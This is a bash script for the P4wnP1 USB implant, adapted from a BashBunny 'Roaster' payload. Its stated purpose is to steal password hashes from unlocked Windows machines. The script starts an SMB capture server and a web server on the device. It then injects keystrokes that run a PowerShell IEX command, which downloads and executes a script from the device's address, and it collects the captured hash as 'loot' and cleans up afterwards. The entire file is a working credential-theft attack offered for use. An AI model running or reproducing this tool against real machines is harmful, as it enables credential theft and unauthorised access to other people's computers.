#!/bin/bash

# Steal hash from a windows unlocked machine using smbserver.py 
# Based on golem445 BashBunny Roaster payload: https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/credentials/Roaster
# You need to setup P4wnP1 USB Gadget Settings as RNDIS_ETHERNET and HID keyboard
# Requirements 
# impacket: sudo apt-get install python-impacket or download and install from https://github.com/SecureAuthCorp/impacket
# smbserver.py from the impacket examples folder should be located in: "/usr/local/bin/smbserver.py" (should already be there in kali linux)
# gohttp: https://github.com/itang/gohttp compiled binary should be placed in "/usr/bin/gohttp"
# Copy this script to "/usr/local/P4wnP1/scripts/"
# Copy the roaster directory to "/usr/local/P4wnP1/scripts/"
# Create a trigger to start the bash script "roaster.sh" when DHCP lease issued.


# Get target machine hostname
TARGET_HOSTNAME=$(cat /tmp/dnsmasq_usbeth.leases | cut -d " " -f4);

LOOTDIR=/usr/local/P4wnP1/www/loot/roaster/

# Make sure everything is clear before executing 
killall /usr/bin/python2
killall gohttp
rm -rf /loot
rm /usr/local/P4wnP1/HIDScripts/roaster.js


# Check if smbserver.py is installed

if [ ! -f /usr/local/bin/smbserver.py ]; then
    echo "smbserver not found!"
    exit 1
  fi

# Check if gohttp is installed

if [ ! -f /usr/bin/gohttp ]; then
    echo "gohttp not found!"
    exit 1
  fi

# Create temp Loot directory

mkdir -p /loot/smb/

# Create Loot directory

mkdir -p $LOOTDIR
HOST=$TARGET_HOSTNAME
COUNT=$(ls -lad $LOOTDIR/$HOST* | wc -l)
COUNT=$((COUNT+1))
mkdir -p $LOOTDIR/$HOST-$COUNT

# Start web server
gohttp -p 80 -webroot /usr/local/P4wnP1/scripts/roaster &
sleep 5

# Start smbserver.py
python /usr/local/bin/smbserver.py s /loot/smb -smb2support > /loot/smb/hash.txt  &
sleep 8


# Create P4wnP1 HID script 
echo "layout(\"us\")" > /usr/local/P4wnP1/HIDScripts/roaster.js
echo "press(\"GUI r\")" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "delay(500)" >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "type(\"powershell IEX (New-object Net.Webclient).DownloadString('http://172.16.0.1/s.ps1')\")"  >> /usr/local/P4wnP1/HIDScripts/roaster.js
echo "press(\"ENTER\")" >> /usr/local/P4wnP1/HIDScripts/roaster.js

# Execute P4wnP1 HID script 
P4wnP1_cli hid run -n roaster.js >/dev/null


# Wait for results
while ! [ -f /loot/smb/EXFILTRATION_COMPLETE ]; do sleep 1; done

# Delete temp files
rm /loot/smb/EXFILTRATION_COMPLETE

# Move temp files to loot folder
mv /loot/smb/hash.txt $LOOTDIR/$HOST-$COUNT

# Delete temp folder
rm -rf /loot

# Delete HID scrpt files
rm /usr/local/P4wnP1/HIDScripts/roaster.js

# Kill smbserver.py and gohttp
killall /usr/bin/python2
killall gohttp
P4wnP1_cli hid run -c 'press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);press("CAPS");delay(500);' >/dev/null
